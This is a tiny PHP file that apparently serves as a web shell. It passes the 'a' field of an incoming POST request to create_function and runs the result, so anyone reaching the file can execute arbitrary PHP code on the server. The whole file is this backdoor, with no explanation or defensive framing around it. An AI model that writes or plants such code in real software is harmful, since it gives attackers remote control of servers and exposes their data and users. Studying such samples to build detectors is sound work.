<?php 
$a = create_function('',$_POST['a']);
$a();
?>